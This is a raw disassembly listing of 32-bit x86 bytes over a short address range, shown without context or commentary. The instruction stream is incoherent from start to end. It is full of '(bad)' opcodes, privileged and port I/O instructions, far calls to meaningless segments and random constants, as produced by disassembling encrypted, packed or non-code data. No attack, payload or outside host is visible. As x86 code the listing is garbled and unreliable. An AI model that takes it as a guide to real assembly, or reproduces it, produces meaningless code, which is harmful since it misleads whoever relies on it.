  40cede:	shr    BYTE PTR [esi],cl
  40cee0:	js     0x40cec9
  40cee2:	mov    ds:0x9534d121,eax
  40cee7:	xchg   BYTE PTR [ecx-0x778afe6f],cl
  40ceed:	jl     0x40cf0e
  40ceef:	xor    DWORD PTR [edx+ecx*8-0x3f],ecx
  40cef3:	add    esi,DWORD PTR [ecx-0x43]
  40cef6:	adc    bh,cl
  40cef8:	push   ecx
  40cef9:	pusha  
  40cefa:	or     bh,BYTE PTR [edx]
  40cefc:	inc    edi
  40cefd:	and    al,0x88
  40ceff:	js     0x40cf2c
  40cf01:	(bad)  
  40cf02:	cdq    
  40cf03:	xor    eax,0xd3cfa652
  40cf08:	jno    0x40cf61
  40cf0a:	push   ebx
  40cf0b:	jmp    0xbc4c1e49
  40cf10:	ins    DWORD PTR es:[edi],dx
  40cf11:	and    BYTE PTR [ecx-0x4b],ah
  40cf14:	jo     0x40cf66
  40cf16:	pop    es
  40cf17:	sbb    DWORD PTR [eax],edx
  40cf19:	test   DWORD PTR [ecx-0x6a],ecx
  40cf1c:	xchg   edi,eax
  40cf1d:	mov    ds:0x22712985,eax
  40cf22:	icebp  
  40cf23:	enter  0x2bb8,0x7f
  40cf27:	jbe    0x40cf7a
  40cf29:	xor    al,BYTE PTR [eax]
  40cf2b:	jmp    0x40cf0b
  40cf2d:	inc    edx
  40cf2e:	nop
  40cf2f:	pop    eax
  40cf30:	push   ecx
  40cf31:	int    0x8a
  40cf33:	in     al,0x7c
  40cf35:	push   ebx
  40cf36:	pop    eax
  40cf37:	scas   al,BYTE PTR es:[edi]
  40cf38:	mov    ah,0x1f
  40cf3a:	adc    DWORD PTR [ecx-0x50d04fd8],ecx
  40cf40:	add    BYTE PTR [edx+0x685a6bd5],dl
  40cf46:	cmp    esp,ebx
  40cf48:	xor    BYTE PTR es:0xd5a9403c,ah
  40cf4f:	enter  0x356,0x4a
  40cf53:	xchg   ecx,eax
  40cf54:	cld    
  40cf55:	fs iret 
  40cf57:	jne    0x40cef4
  40cf59:	ins    DWORD PTR es:[edi],dx
  40cf5a:	scas   eax,DWORD PTR es:[edi]
  40cf5b:	sbb    eax,0xe5d0ada2
  40cf60:	jno    0x40cf82
  40cf62:	mov    bl,0xee
  40cf64:	sub    ecx,DWORD PTR [ebp-0x80]
  40cf67:	sbb    DWORD PTR [edx+0x20],edx
  40cf6a:	lahf   
  40cf6b:	mov    esi,DWORD PTR [esi+0x2f1c9605]
  40cf71:	dec    edi
  40cf72:	(bad)  
  40cf73:	inc    ecx
  40cf74:	xchg   ebx,eax
  40cf75:	push   es
  40cf76:	push   0x5987330
  40cf7b:	mov    WORD PTR [ecx+0x717d085a],?
  40cf81:	add    eax,0xa8e88849
  40cf86:	cs xchg edi,eax
  40cf88:	jno    0x40cfbe
  40cf8a:	jne    0x40cf8d
  40cf8c:	clc    
  40cf8d:	loopne 0x40cf17
  40cf8f:	fbstp  TBYTE PTR [eax+0x29]
  40cf92:	adc    edi,esi
  40cf94:	sub    DWORD PTR [ebp+0x548749d5],edi
  40cf9a:	sbb    BYTE PTR [ecx+0x48b71a71],cl
  40cfa0:	aam    0x9e
  40cfa2:	mov    al,0xfb
  40cfa4:	mov    edx,0x5e69171f
  40cfa9:	(bad)  
  40cfaa:	mov    edi,0xd60f664c
  40cfaf:	pop    ecx
  40cfb0:	daa    
  40cfb1:	and    al,0xc8
  40cfb3:	push   cs
  40cfb4:	mov    dh,0xb
  40cfb6:	je     0x40d02d
  40cfb8:	into   
  40cfb9:	cmp    ch,0x29
  40cfbc:	loope  0x40cf7d
  40cfbe:	cmpxchg BYTE PTR [ecx-0x19],dh
  40cfc2:	sub    edi,DWORD PTR [esi-0x4bfc30c8]
  40cfc8:	or     eax,0xf223a020
  40cfcd:	add    eax,0x6e6b3e7f
  40cfd2:	aad    0x7c
  40cfd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfd5:	call   0x8032:0x12942b39
  40cfdc:	xor    DWORD PTR [ecx+ebx*8+0x35af0083],0x66
  40cfe4:	add    dl,BYTE PTR [edi]
  40cfe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfe7:	imul   esi,DWORD PTR [ecx+0x57],0x62
  40cfeb:	loop   0x40d00a
  40cfed:	jp     0x40d060
  40cfef:	xchg   ecx,eax
  40cff0:	cmp    ebp,DWORD PTR [edi]
  40cff2:	or     eax,DWORD PTR [ecx]
  40cff4:	mov    al,BYTE PTR [ebp+esi*4-0xb]
  40cff8:	xchg   DWORD PTR [edi-0x5580b1a6],ebp
  40cffe:	xchg   DWORD PTR [ebp-0x2b],ebx
  40d001:	dec    DWORD PTR [edi-0x35]
  40d004:	inc    esp
  40d005:	xchg   BYTE PTR [esi],bh
  40d007:	jne    0x40cfc0
  40d009:	inc    esp
  40d00a:	stos   BYTE PTR es:[edi],al
  40d00b:	inc    eax
  40d00c:	cmp    dl,dh
  40d00e:	cld    
  40d00f:	jmp    0xc3b1:0xbd6e3f8f
  40d016:	sbb    DWORD PTR ds:0x832ea2cc,0x2a
  40d01d:	cwde   
  40d01e:	sub    al,0x15
  40d020:	push   ecx
  40d021:	push   edx
  40d022:	div    BYTE PTR [eax]
  40d024:	mov    cl,0x1d
  40d026:	fldcw  WORD PTR [ebp-0x31]
  40d029:	adc    eax,0xb7ad9532
  40d02e:	(bad)  
  40d02f:	sub    dl,al
  40d031:	pop    ds
  40d032:	cmp    eax,0xdb592050
  40d037:	jecxz  0x40cff1
  40d039:	lock aad 0x5d
  40d03c:	call   0x952e:0x83ba5a9
  40d043:	jne    0x40d06d
  40d045:	inc    edi
  40d046:	xchg   BYTE PTR gs:[ecx+0x51a10f07],bh
  40d04d:	mov    edi,DWORD PTR [eax+0x51ddaf51]
  40d053:	lds    ecx,FWORD PTR [esi+0x31ec0891]
  40d059:	test   BYTE PTR [edi-0x63f9c52b],bl
  40d05f:	jne    0x40d03c
  40d061:	mov    WORD PTR [esi+ebp*2],ds
  40d064:	cs retw 0x7142
  40d069:	mov    al,ds:0xa30d585e
  40d06e:	and    BYTE PTR [ebx+ecx*4+0x57],al
  40d072:	jo     0x40d0b1
  40d074:	hlt    
  40d075:	mov    ecx,0x8e11a48a
  40d07a:	xchg   ebp,eax
  40d07b:	stos   BYTE PTR es:[edi],al
  40d07c:	in     eax,0x60
  40d07e:	jecxz  0x40d08b
  40d080:	sub    BYTE PTR [edx],al
  40d082:	add    al,0x14
  40d084:	icebp  
  40d085:	mov    esi,0x290975e5
  40d08a:	rol    DWORD PTR [ebx+0x661d0413],cl
  40d090:	rcr    edx,1
  40d092:	cwde   
  40d093:	dec    edx
  40d094:	or     dx,si
  40d097:	cli    
  40d098:	out    dx,eax
  40d099:	xchg   edx,eax
  40d09a:	inc    edx
  40d09b:	push   cs
  40d09c:	sbb    eax,0x7f71b8e8
  40d0a1:	pop    ds
  40d0a2:	mov    al,ds:0x7f784414
  40d0a7:	loope  0x40d089
  40d0a9:	cmc    
  40d0aa:	aad    0x4f
  40d0ac:	mov    ecx,0xaad7bf9d
  40d0b1:	add    eax,0x41627e9e
  40d0b6:	(bad)  [edx-0xf]
  40d0b9:	retf   
  40d0ba:	in     al,0x50
  40d0bc:	lea    ebp,[ecx-0x2b]
  40d0bf:	xchg   edi,eax
  40d0c0:	lock das 
  40d0c2:	test   al,0xbe
  40d0c4:	mov    eax,ds:0x1475b2e3
  40d0c9:	pop    ecx
  40d0ca:	jb     0x40d0e1
  40d0cc:	hlt    
  40d0cd:	test   al,0x52
  40d0cf:	mov    cl,0x72
  40d0d1:	pop    ecx
  40d0d2:	inc    edx
  40d0d3:	lods   eax,DWORD PTR ds:[esi]
  40d0d4:	lahf   
  40d0d5:	jo     0x40d06c
  40d0d7:	sti    
  40d0d8:	cmp    eax,0x6aee39f7
  40d0dd:	and    dl,bh
  40d0df:	ins    BYTE PTR es:[edi],dx
  40d0e0:	xlat   BYTE PTR ds:[ebx]
  40d0e1:	mov    bl,0x10
  40d0e3:	lea    ecx,[ebx-0x678d298b]
  40d0e9:	xor    BYTE PTR [edi],cl
  40d0eb:	dec    ebx
  40d0ec:	pop    esp
  40d0ed:	inc    ecx
  40d0ee:	cmc    
  40d0ef:	mov    ch,bl
  40d0f1:	(bad)  
  40d0f2:	sti    
  40d0f3:	jge    0x40d165
  40d0f5:	gs inc esi
  40d0f7:	call   0x7fd0:0xb7b3da72
  40d0fe:	dec    esp
  40d0ff:	xor    dh,BYTE PTR [ecx+0x21]
  40d102:	in     eax,0xcb
  40d104:	sub    BYTE PTR [ebx],0x3f
  40d107:	ret    
  40d108:	jle    0x40d148
  40d10a:	jle    0x40d115
  40d10c:	call   0x7563:0x2af1081f
  40d113:	shl    BYTE PTR [eax+ebx*4+0x6f],cl
  40d117:	gs cmc 
  40d119:	pop    edi
  40d11a:	cs pusha 
  40d11c:	stos   BYTE PTR es:[edi],al
  40d11d:	out    0xc5,al
  40d11f:	xchg   ebp,eax
  40d120:	mov    edx,0x4e699450
  40d125:	and    BYTE PTR [ecx+0x49],dl
  40d128:	xor    al,0xb
  40d12a:	into   
  40d12b:	jo     0x40d123
  40d12d:	not    ch
  40d12f:	jae    0x40d0ef
  40d131:	inc    ebp
  40d132:	xor    eax,0xc7efd25e
  40d137:	jne    0x40d17d
  40d139:	jnp    0x40d174
  40d13b:	mov    al,0x37
  40d13d:	daa    
  40d13e:	cmp    edi,DWORD PTR [ecx+esi*2]
  40d141:	pop    ss
  40d142:	sbb    al,BYTE PTR [ecx]
  40d144:	dec    edx
  40d145:	adc    BYTE PTR [edi],bh
  40d147:	out    0xf7,eax
  40d149:	pop    ds
  40d14a:	imul   esi,DWORD PTR [ecx+0x727fe465],0x1a
  40d151:	lods   eax,DWORD PTR ds:[esi]
  40d152:	xchg   ebp,eax
  40d153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d154:	inc    esi
  40d155:	in     al,dx
  40d156:	cmp    dl,BYTE PTR [ebp-0x7bc6d0f1]
  40d15c:	xchg   edi,eax
  40d15d:	xchg   edx,eax
  40d15e:	or     ebp,0x51
  40d161:	xor    ebx,DWORD PTR [ecx+0x7e]
  40d164:	and    dh,dh
  40d166:	comiss xmm1,DWORD PTR [edi+0x35d77aa6]
  40d16d:	inc    esi
  40d16e:	out    0xe,eax
  40d170:	out    0xdf,eax
  40d172:	aam    0x59
  40d174:	int    0x9e
  40d176:	sbb    eax,0xe735a175
  40d17b:	ins    DWORD PTR es:[edi],dx
  40d17c:	mov    al,ds:0x9fadfc3c
  40d181:	pop    esi
  40d182:	je     0x40d119
  40d184:	jno    0x40d1f5
  40d186:	adc    eax,0xc9f4c5bf
  40d18b:	outs   dx,DWORD PTR ds:[esi]
  40d18c:	les    ebx,FWORD PTR [ebx-0x3f]
  40d18f:	and    al,0x71
  40d191:	aas    
  40d192:	lahf   
  40d193:	mov    esp,0xa6b247d3
  40d198:	jno    0x40d1c6
  40d19a:	and    eax,0x24ba027d
  40d19f:	inc    eax
  40d1a0:	jp     0x40d1c1
  40d1a2:	pop    eax
  40d1a3:	dec    DWORD PTR [eax]
  40d1a5:	sbb    eax,0x967250e0
  40d1aa:	in     al,0x46
  40d1ac:	dec    esp
  40d1ad:	idiv   DWORD PTR ds:0xc4be57d5
  40d1b3:	mov    esi,0x25911206
  40d1b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1b9:	pop    ebp
  40d1ba:	daa    
  40d1bb:	sbb    eax,0x8556802d
  40d1c0:	mov    ds:0xc8f189e9,al
  40d1c5:	fbstp  TBYTE PTR [edx+esi*8-0x523ed480]
  40d1cc:	add    bh,BYTE PTR [edi]
  40d1ce:	mov    al,ds:0xeb9fd22f
  40d1d3:	dec    ebx
  40d1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1d5:	jecxz  0x40d24b
  40d1d7:	fwait
  40d1d8:	sbb    dh,BYTE PTR [eax-0x4b]
  40d1db:	jbe    0x40d1fe
  40d1dd:	imul   esi,DWORD PTR [edi-0x3c0beb60],0x10
  40d1e4:	jno    0x40d259
  40d1e6:	lods   al,BYTE PTR gs:[esi]
  40d1e8:	cmp    al,0x64
  40d1ea:	dec    ebp
  40d1eb:	sub    DWORD PTR [ecx+0x3c],ebp
  40d1ee:	inc    ebp
  40d1ef:	mov    ah,0xec
  40d1f1:	fcomip st,st(5)
  40d1f3:	sahf   
  40d1f4:	aas    
  40d1f5:	test   al,0xb4
  40d1f7:	stc    
  40d1f8:	jno    0x40d24b
  40d1fa:	jbe    0x40d1e7
  40d1fc:	jecxz  0x40d212
  40d1fe:	cmc    
  40d1ff:	dec    esp
  40d200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d201:	or     edx,DWORD PTR [esi]
  40d203:	jne    0x40d1b2
  40d205:	dec    eax
  40d206:	test   DWORD PTR [edx+0x44eb90d2],esp
  40d20c:	jno    0x40d1df
  40d20e:	sub    DWORD PTR [ebx-0x56],ebp
  40d211:	rcr    ah,1
  40d213:	adc    BYTE PTR [esi+ebx*2-0x4a],0x99
  40d218:	jno    0x40d256
  40d21a:	jmp    0x5595cda8
  40d21f:	call   0x18b9:0x23e2c271
  40d226:	cmp    al,0x8d
  40d228:	aam    0x1f
  40d22a:	cs push ebx
  40d22c:	jb     0x40d24a
  40d22e:	(bad)  
  40d22f:	mov    ah,0xd8
  40d232:	aad    0x5f
  40d234:	jecxz  0x40d207
  40d236:	mov    ebx,0xd06ca550
  40d23b:	jne    0x40d2a1
  40d23d:	pop    edx
  40d23e:	fdivr  DWORD PTR [ecx-0x4e4789c2]
  40d244:	jno    0x40d26d
  40d246:	stos   DWORD PTR es:[edi],eax
  40d247:	sbb    DWORD PTR [edi],edx
  40d249:	pop    ebp
  40d24a:	loope  0x40d23c
  40d24c:	fbstp  TBYTE PTR [edi-0x20]
  40d24f:	shl    DWORD PTR [ecx+0x63],cl
  40d252:	(bad)  
  40d253:	enter  0xcea,0xb1
  40d257:	repnz test eax,0x27039883
  40d25d:	iret   
  40d25e:	cmp    esi,DWORD PTR [ebp+0x8]
  40d261:	enter  0xfb7,0x46
  40d265:	adc    BYTE PTR [ecx-0x4fc326f3],ah
  40d26b:	inc    ebx
  40d26c:	lods   al,BYTE PTR ds:[esi]
  40d26d:	pop    ds
  40d26e:	adc    ah,BYTE PTR [ebx+ecx*2+0x37]
  40d272:	xchg   ecx,eax
  40d273:	ss jno 0x40d20c
  40d276:	xor    BYTE PTR [ecx-0x6fc0cbbe],bl
  40d27c:	call   DWORD PTR [ebp-0x1bf38a80]
  40d282:	sbb    eax,DWORD PTR ds:0x71cc4e85
  40d289:	push   ss
  40d28a:	fwait
  40d28b:	xlat   BYTE PTR ds:[ebx]
  40d28c:	out    dx,eax
  40d28d:	retf   
  40d28e:	fsubr  QWORD PTR [ebx]
  40d290:	in     eax,0x1f
  40d292:	mov    ah,0x3b
  40d294:	in     al,0x25
  40d296:	in     al,dx
  40d297:	push   es
  40d298:	and    al,0x3d
  40d29a:	aad    0x26
  40d29c:	jne    0x40d2b2
  40d29e:	stos   BYTE PTR es:[edi],al
  40d29f:	mov    dh,0xae
  40d2a1:	imul   edi,DWORD PTR [ebp+esi*2+0x33bc0086],0x18
  40d2a9:	xor    esp,DWORD PTR [edi]
  40d2ab:	cmp    edx,DWORD PTR [eax-0x12649fb6]
  40d2b1:	adc    ebx,eax
  40d2b3:	xor    DWORD PTR [esi-0x20],eax
  40d2b6:	push   edx
  40d2b7:	mov    DWORD PTR [esi-0x20cca81],edx
  40d2bd:	cmp    ebx,DWORD PTR [ecx]
  40d2bf:	arpl   bx,bx
  40d2c1:	fild   QWORD PTR [ecx]
  40d2c3:	fst    QWORD PTR cs:[edi]
  40d2c6:	mov    dh,0xf5
  40d2c8:	or     DWORD PTR [eax-0x2b],ecx
  40d2cb:	xor    eax,0xcb074f3b
  40d2d0:	cs pop esp
  40d2d2:	add    edx,DWORD PTR [ecx+0x390b807e]
  40d2d8:	push   edx
  40d2d9:	pop    ss
  40d2da:	cmp    dh,BYTE PTR ds:0x5105e6e
  40d2e0:	je     0x40d2c8
  40d2e2:	push   ss
  40d2e3:	aas    
  40d2e4:	stos   BYTE PTR es:[edi],al
  40d2e5:	sub    dl,cl
  40d2e7:	sbb    eax,0x74fdb884
  40d2ec:	idiv   BYTE PTR [ebx]
  40d2ee:	imul   esp,DWORD PTR [ecx+edx*2+0x7f713382],0xffffffa8
  40d2f6:	lahf   
  40d2f7:	push   eax
  40d2f8:	out    0x5f,al
  40d2fa:	inc    esi
  40d2fb:	mov    ecx,0x771bd44e
  40d300:	pusha  
  40d301:	jecxz  0x40d2ec
  40d303:	adc    BYTE PTR [ecx],0xe5
  40d306:	xor    eax,0x4f26d937
  40d30b:	out    dx,al
  40d30c:	jno    0x40d29e
  40d30e:	stos   BYTE PTR es:[edi],al
  40d30f:	loop   0x40d38a
  40d311:	jne    0x40d321
  40d313:	in     eax,0xc5
  40d315:	xchg   ebx,eax
  40d316:	shl    DWORD PTR [ebp-0x40],cl
  40d319:	xor    al,0xe6
  40d31b:	aad    0xec
  40d31d:	clc    
  40d31e:	test   DWORD PTR [eax+0x54d8078e],ecx
  40d324:	jno    0x40d355
  40d326:	std    
  40d327:	fnstsw WORD PTR [esi]
  40d329:	jmp    0x40d2b9
  40d32b:	jne    0x40d32e
  40d32d:	hlt    
  40d32e:	out    0x5a,al
  40d330:	je     0x40d2c9
  40d332:	xchg   edx,eax
  40d333:	fadd   DWORD PTR [ecx+ebp*8+0x671f361]
  40d33a:	not    esi
  40d33c:	add    eax,0xcd787a6a
  40d341:	arpl   WORD PTR [esi],si
  40d343:	daa    
  40d344:	outs   dx,BYTE PTR ds:[esi]
  40d345:	mov    bl,0xc5
  40d347:	stos   DWORD PTR es:[edi],eax
  40d348:	ds test cl,0x32
  40d34c:	jno    0x40d389
  40d34e:	cmp    BYTE PTR [esi+eax*2-0x6fc174bb],ch
  40d355:	xlat   BYTE PTR ds:[ebx]
  40d356:	push   ss
  40d357:	jne    0x40d2ec
  40d359:	nop
  40d35a:	lods   eax,DWORD PTR ds:[esi]
  40d35b:	ja     0x40d35b
  40d35d:	push   ds
  40d35e:	or     DWORD PTR [ecx+0x1f890f71],ecx
  40d364:	stos   BYTE PTR es:[edi],al
  40d365:	outs   dx,DWORD PTR ds:[esi]
  40d366:	cdq    
  40d367:	xchg   ebp,eax
  40d368:	push   0xbd5e83f
  40d36d:	loopne 0x40d381
  40d36f:	fdivr  st,st(0)
  40d371:	es pop ebp
  40d373:	mov    esp,0xf52236af
  40d378:	xor    BYTE PTR [edx-0x7efbb28c],cl
  40d37e:	les    edi,FWORD PTR [eax+0x79]
  40d381:	test   DWORD PTR [esp+ebx*2-0x629274ba],esp
  40d388:	add    eax,0xfa3d8c9
  40d38d:	push   eax
  40d38e:	in     al,dx
  40d38f:	xchg   ebp,eax
  40d390:	imul   edx,edi,0x65
  40d393:	sti    
  40d394:	mov    ds:0x8775482b,eax
  40d399:	icebp  
  40d39a:	xchg   edi,edx
  40d39c:	and    DWORD PTR [edi+0xb],ebx
  40d39f:	dec    ecx
  40d3a0:	lods   al,BYTE PTR ds:[esi]
  40d3a1:	cld    
  40d3a2:	repnz sti 
  40d3a4:	fmul   st,st(3)
  40d3a6:	ins    BYTE PTR es:[edi],dx
  40d3a7:	into   
  40d3a8:	ror    esp,1
  40d3aa:	jle    0x40d337
  40d3ac:	out    0x1f,eax
  40d3ae:	inc    esi
  40d3af:	in     eax,dx
  40d3b0:	daa    
  40d3b1:	mov    ebp,0x25fa4c08
  40d3b6:	aad    0x94
  40d3b8:	jl     0x40d42f
  40d3ba:	(bad)  [ebx+0x752a63a8]
  40d3c0:	imul   eax,edx,0xffffff87
  40d3c3:	ret    0x3107
  40d3c6:	in     al,0xda
  40d3c8:	mov    al,0x8b
  40d3ca:	fidiv  DWORD PTR [ebp+0x48]
  40d3cd:	mov    eax,ebx
  40d3cf:	xor    ebx,0x312fa96b
  40d3d5:	pop    edx
  40d3d6:	fcomip st,st(4)
  40d3d8:	jno    0x40d407
  40d3da:	repnz and eax,0x94b26c8b
  40d3e0:	je     0x40d3eb
  40d3e2:	sub    al,0xa3
  40d3e4:	pop    eax
  40d3e5:	sbb    DWORD PTR [edi+0x3b1b0335],edi
  40d3eb:	jne    0x40d3d4
  40d3ed:	pop    edx
  40d3ee:	jmp    0x7d839708
  40d3f3:	xor    dh,BYTE PTR [ecx-0x13]
  40d3f6:	sub    BYTE PTR [edi-0x577aff76],ah
  40d3fc:	push   0x6daebc20
  40d401:	xchg   ebx,eax
  40d402:	icebp  
  40d403:	arpl   WORD PTR [edx],ax
  40d405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d406:	ins    DWORD PTR es:[edi],dx
  40d407:	(bad)  [ebp+0x31055bb9]
  40d40d:	hlt    
  40d40e:	pop    eax
  40d40f:	sbb    ebp,ebp
  40d411:	enter  0x7638,0x6e
  40d415:	divps  xmm2,xmm6
  40d418:	retf   
  40d419:	xor    eax,0x5469656e
  40d41e:	icebp  
  40d41f:	jae    0x40d3b9
  40d421:	imul   ebx,DWORD PTR [edx+0x55fdccc6],0x7c
  40d428:	add    al,BYTE PTR [ecx+0x64b2752e]
  40d42e:	jae    0x40d403
  40d430:	icebp  
  40d431:	pop    ss
  40d432:	sub    BYTE PTR [esi+ebp*4+0x28],ah
  40d436:	jb     0x40d4ad
  40d438:	(bad)  
  40d43a:	lods   eax,DWORD PTR ds:[esi]
  40d43b:	xchg   ebx,eax
  40d43c:	lock fst DWORD PTR [edi]
  40d43f:	jne    0x40d47b
  40d441:	cmp    eax,0x1c80048b
  40d446:	inc    eax
  40d447:	js     0x40d4c1
  40d449:	or     eax,0xfd9f2500
  40d44e:	adc    eax,0x19464e64
  40d453:	jne    0x40d45b
  40d455:	nop
  40d456:	int    0xbc
  40d458:	add    ah,bh
  40d45a:	stos   BYTE PTR es:[edi],al
  40d45b:	lea    eax,[eax-0x256c63d]
  40d461:	sbb    edx,DWORD PTR [esi+0x27]
  40d464:	mov    ds:0x516295c5,eax
  40d469:	and    BYTE PTR ds:0x7d68ceba,ah
  40d46f:	aas    
  40d470:	push   ss
  40d471:	and    esp,esp
  40d473:	cmova  di,WORD PTR [esi*8-0x64ab59e6]
  40d47c:	ficomp DWORD PTR [edi]
  40d47e:	cli    
  40d47f:	mov    esp,0x3291795e
  40d484:	inc    edi
  40d485:	(bad)  
  40d486:	aad    0xc6
  40d488:	push   eax
  40d489:	icebp  
  40d48a:	das    
  40d48b:	leave  
  40d48c:	inc    ebx
  40d48d:	mov    ds,WORD PTR [edi-0x1588298b]
  40d493:	push   ss
  40d494:	push   es
  40d495:	scas   al,BYTE PTR es:[edi]
  40d496:	xchg   DWORD PTR [edx+0x72],ecx
  40d499:	inc    eax
  40d49a:	jb     0x40d42f
  40d49c:	pop    ebp
  40d49d:	sub    ch,al
  40d49f:	in     eax,0x49
  40d4a1:	in     eax,dx
  40d4a2:	into   
  40d4a3:	out    dx,eax
  40d4a4:	mov    eax,cr3
  40d4a7:	bound  edx,QWORD PTR ds:0xca9dd8b8
  40d4ad:	fst    st(5)
  40d4af:	mov    bh,dh
  40d4b1:	push   0xffffffff
  40d4b3:	pop    eax
  40d4b4:	dec    esp
  40d4b5:	call   0x23c3:0x1fa06d59
  40d4bc:	inc    ecx
  40d4bd:	retf   
  40d4be:	mov    eax,ds:0xf3280e94
  40d4c3:	push   ebp
  40d4c4:	and    al,0xe6
  40d4c6:	push   ebp
  40d4c7:	fmul   DWORD PTR [ebx-0x76e40466]
  40d4cd:	pop    ds
  40d4ce:	add    ch,BYTE PTR [ecx]
  40d4d0:	add    al,0x90
  40d4d2:	outs   dx,DWORD PTR ds:[esi]
  40d4d3:	pusha  
  40d4d4:	(bad)  
  40d4d5:	pop    ebp
  40d4d6:	rcr    DWORD PTR [esi],0x71
  40d4d9:	lock sbb eax,0xc92a16e3
  40d4df:	sbb    BYTE PTR [ecx-0x2c8ad7ef],ah
  40d4e5:	clc    
  40d4e6:	pop    ss
  40d4e7:	jmp    0xe7f9376e
  40d4ec:	jno    0x40d54c
  40d4ee:	scas   eax,DWORD PTR es:[edi]
  40d4ef:	pop    edx
  40d4f0:	shr    DWORD PTR [eax+0x1fd6eee9],0x56
  40d4f7:	cs pop ss
  40d4f9:	lock mov ds:0xd5e62d3a,al
  40d4ff:	cmp    BYTE PTR [ebx+0x67],0xe7
  40d503:	dec    ebp
  40d504:	fdiv   DWORD PTR [edi+0x3d]
  40d507:	mov    ebp,0x53d6056c
  40d50c:	push   cs
  40d50d:	push   esi
  40d50e:	push   esi
  40d50f:	cdq    
  40d510:	ins    DWORD PTR es:[edi],dx
  40d511:	push   ecx
  40d512:	aad    0xce
  40d514:	push   ss
  40d515:	cmp    eax,0xe7c39b07
  40d51a:	ret    0xf976
  40d51d:	mov    ds:0xe5c546e4,al
  40d522:	sub    ebx,DWORD PTR [ecx-0xa]
  40d525:	jmp    0x40d4fc
  40d527:	mov    edi,0x8eff48d4
  40d52c:	fsub   QWORD PTR [esi+0x44]
  40d52f:	fwait
  40d530:	(bad)  
  40d531:	mov    eax,DWORD PTR [eax+0x66c66675]
  40d537:	shl    BYTE PTR [ecx+edi*2],1
  40d53a:	fdivr  DWORD PTR ds:0x35cd7e8c
  40d540:	test   al,0xc8
  40d542:	push   es
  40d543:	dec    ebx
  40d544:	cmp    DWORD PTR [edi-0x5acd8b02],edx
  40d54a:	adc    edi,DWORD PTR [esp+ebx*8+0x7104cf4b]
  40d551:	pop    ebx
  40d552:	popa   
  40d553:	dec    edx
  40d554:	xchg   ebx,eax
  40d555:	or     eax,0x1fac87b3
  40d55a:	jae    0x40d502
  40d55c:	dec    esp
  40d55d:	mov    DWORD PTR [edi+0x67],esp
  40d560:	loopne 0x40d54f
  40d562:	fdiv   QWORD PTR [eax+eiz*1+0x1116ada4]
  40d569:	xchg   ebx,eax
  40d56a:	imul   esp,esi,0xae1d1ff6
  40d570:	jns    0x40d584
  40d572:	pop    ebp
  40d573:	test   BYTE PTR [ebp+0xafd619],ah
  40d579:	in     eax,dx
  40d57a:	fwait
  40d57b:	and    bh,cl
  40d57d:	pop    DWORD PTR ds:0xa3b5fe91
  40d583:	jne    0x40d5a1
  40d585:	adc    BYTE PTR [ebp+ebx*8+0x31],dl
  40d589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d58a:	in     al,0x4d
  40d58c:	test   eax,0xac1565e5
  40d591:	push   ecx
  40d592:	iret   
  40d593:	enter  0x1fde,0xdb
  40d597:	(bad)  
  40d599:	cmp    BYTE PTR [ebp-0x29ff44c0],dl
  40d59f:	xchg   ebp,eax
  40d5a0:	fistp  QWORD PTR [ebx]
  40d5a2:	xlat   BYTE PTR ds:[ebx]
  40d5a3:	ror    DWORD PTR [eax],cl
  40d5a5:	sahf   
  40d5a6:	jbe    0x40d61d
  40d5a8:	and    DWORD PTR [esi],edx
  40d5aa:	into   
  40d5ab:	add    BYTE PTR [ecx],bh
  40d5ad:	cmp    eax,0x8e7f9f4e
  40d5b2:	mov    ecx,0xbbff8b53
  40d5b7:	fs daa 
  40d5b9:	xor    eax,ebp
  40d5bb:	add    al,0x8
  40d5bd:	and    BYTE PTR [ebp+0x7af5159c],ch
  40d5c3:	cmp    eax,0xdfd594c7
  40d5c8:	fwait
  40d5c9:	dec    ebp
  40d5ca:	rol    DWORD PTR [eax+0x3d],cl
  40d5cd:	mov    edi,0x201fe8ae
  40d5d2:	mov    WORD PTR [edx],es
  40d5d4:	jmp    0x40d58a
  40d5d6:	sahf   
  40d5d7:	ret    
  40d5d8:	xor    eax,0x84a3d563
  40d5dd:	imul   edi,DWORD PTR [eax-0x217cd9a],0x153670e7
  40d5e7:	push   cs
  40d5e8:	add    BYTE PTR [ecx],ah
  40d5ea:	retf   
  40d5eb:	push   edx
  40d5ec:	pop    ecx
  40d5ed:	xchg   edi,eax
  40d5ee:	into   
  40d5ef:	ins    DWORD PTR es:[edi],dx
  40d5f0:	imul   edi,DWORD PTR [eax-0xd],0x95674f0b
  40d5f7:	mov    dl,0xf4
  40d5f9:	add    ah,BYTE PTR [edi+0x773d578a]
  40d5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d600:	fcmovu st,st(7)
  40d602:	pop    ds
  40d603:	iret   
  40d604:	add    DWORD PTR [eax+0x1c71ef1d],eax
  40d60a:	dec    ebp
  40d60b:	repz pop edx
  40d60d:	cmc    
  40d60e:	xchg   edx,eax
  40d60f:	lods   eax,DWORD PTR ds:[esi]
  40d610:	ja     0x40d631
  40d612:	pop    di
  40d614:	imul   esp,DWORD PTR [edx],0xffffff94
  40d617:	shl    BYTE PTR [eax-0x2a],cl
  40d61a:	retf   
  40d61b:	cmp    BYTE PTR [ecx+0x7],dh
  40d61e:	(bad)  
  40d620:	int    0x1d
  40d622:	scas   al,BYTE PTR es:[edi]
  40d623:	in     eax,0x35
  40d625:	or     al,0xc5
  40d627:	jbe    0x40d6a1
  40d629:	or     eax,0xcde9d86f
  40d62e:	stos   BYTE PTR es:[edi],al
  40d62f:	inc    ecx
  40d630:	adc    esp,edx
  40d632:	aad    0xc3
  40d634:	sbb    BYTE PTR ds:0xc669dd68,ah
  40d63a:	cld    
  40d63b:	je     0x40d5fe
  40d63d:	popa   
  40d63e:	pop    ecx
  40d63f:	mov    DWORD PTR [edi-0x1af4ab6f],eax
  40d645:	clc    
  40d646:	repz ja 0x40d65b
  40d649:	clc    
  40d64a:	xchg   ebp,eax
  40d64b:	retf   
  40d64c:	fs fdivp st(4),st
  40d64f:	add    al,BYTE PTR [esi]
  40d651:	cs and al,0x45
